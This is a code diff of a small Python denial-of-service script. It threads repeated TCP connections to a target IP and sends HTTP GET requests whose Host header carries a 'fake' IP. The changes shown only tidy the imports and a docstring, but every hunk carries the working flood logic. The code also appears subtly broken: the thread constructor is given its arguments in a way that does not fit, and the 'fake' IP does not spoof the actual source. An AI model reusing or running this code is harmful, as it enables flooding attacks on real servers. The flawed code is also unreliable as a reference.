@@ -21,8 +21,8 @@ Related documentations/articles
     - reStructuredText doc: https://docutils.sourceforge.io/rst.html
 """
 
-import socket
-import threading
+from socket import socket, AF_INET, SOCK_STREAM
+from threading import Thread
 
 
 _attack_num = 0
@@ -39,7 +39,7 @@ def _attack(target_ip: str, fake_ip: str, port: int):
     :type port: int
     """
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = socket(AF_INET, SOCK_STREAM)
         s.connect((target_ip, port))
         s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
@@ -54,7 +54,7 @@ def _attack(target_ip: str, fake_ip: str, port: int):
 def attack(number_of_attacks: int, target_ip: str, fake_ip: str, port: int):
     """Makes multiple attacks on multiple targets asynchronously.
 
-    :param number_of_attacks: [description]
+    :param number_of_attacks: number of attacks
     :type number_of_attacks: int
     :param target_ip: target ip
     :type target_ip: str
@@ -64,7 +64,7 @@ def attack(number_of_attacks: int, target_ip: str, fake_ip: str, port: int):
     :type port: int
     """
     for _ in range(number_of_attacks):
-        thread = threading.Thread(target_ip, fake_ip, port, target=_attack)
+        thread = Thread(target_ip, fake_ip, port, target=_attack)
         thread.start()
 
 
